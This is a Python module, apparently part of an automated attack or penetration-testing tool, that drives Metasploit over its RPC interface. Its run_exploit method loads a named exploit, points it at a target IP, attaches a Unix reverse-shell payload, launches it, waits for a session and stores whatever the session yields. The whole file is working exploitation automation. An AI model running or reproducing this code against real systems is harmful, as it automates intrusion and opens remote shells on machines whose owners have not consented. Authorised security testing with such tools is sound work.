try:
    from pymetasploit3.msfrpc import MsfRpcClient
except Exception:
    MsfRpcClient = None

from core.metasploit_manager import MetasploitManager
from core.session_manager import SessionManager


class MetasploitRPC:
    def __init__(self):
        self.client = None

    def connect(self):
        if MsfRpcClient is None:
            print("[!] pymetasploit3 is not installed. Skipping Metasploit module.")
            return False

        manager = MetasploitManager()
        if not manager.start_rpc():
            return False

        try:
            self.client = MsfRpcClient(
                password=manager.password,
                server=manager.host,
                port=manager.port,
                ssl=False,
            )
            print("[+] Connected to Metasploit RPC")
            return True
        except Exception as exc:
            print(f"[!] RPC connection failed: {exc}")
            return False

    def run_exploit(self, exploit_name, target_ip, state):
        if not self.client:
            print("[!] RPC client unavailable.")
            return False

        try:
            exploit = self.client.modules.use("exploit", exploit_name)
            payload = self.client.modules.use("payload", "cmd/unix/reverse")
            exploit["RHOSTS"] = target_ip

            print("[*] Launching exploit")
            exploit.execute(payload=payload)

            session_manager = SessionManager(self.client)
            session_id = session_manager.wait_for_session()
            if not session_id:
                return False

            results = session_manager.interact(session_id)
            state.session_data = results
            print("[+] Session data stored in state")
            return True
        except Exception as exc:
            print(f"[!] Exploit failed: {exc}")
            return False
